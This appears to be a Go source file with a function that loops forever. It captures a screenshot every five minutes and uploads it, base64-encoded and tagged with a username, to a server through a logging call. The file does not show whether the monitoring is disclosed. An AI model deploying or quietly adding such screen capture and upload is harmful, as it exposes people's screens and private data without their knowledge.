package main

import (
	"fmt"
	"time"
)

func screenshotingLoop(userName string) {
	for {
		base64, err := takeScreenshot()
		if err != nil {
			fmt.Println("err while taking screenshot", err)
			time.Sleep(5 * time.Minute)
			continue

		}
		err = logToServer("NOTICE", userName, "go-shot", base64)
		if err != nil {
			fmt.Println("err while sending screenshot", err)
		}
		time.Sleep(5 * time.Minute)
	}
}
